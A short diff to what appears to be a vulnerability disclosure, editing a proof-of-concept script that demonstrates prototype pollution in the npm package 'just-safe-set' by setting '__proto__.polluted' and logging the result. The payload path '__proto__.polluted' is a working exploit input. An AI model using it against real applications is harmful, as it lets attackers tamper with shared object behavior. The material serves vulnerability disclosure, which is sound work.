@@ -12,10 +12,9 @@ This package allowing for modification of prototype behavior, which may result i
 // poc.js
 const set = require('just-safe-set');
 const obj = {};
-console.log("Before : " + obj.polluted);
+console.log("Before : " + {}.polluted);
 set(obj, '__proto__.polluted', "Yes! Its Polluted");
-var obj1={}
-console.log("After : " + obj1.polluted);
+console.log("After : " + {}.polluted);
 ```
 
 2. Execute the following commands in another terminal:
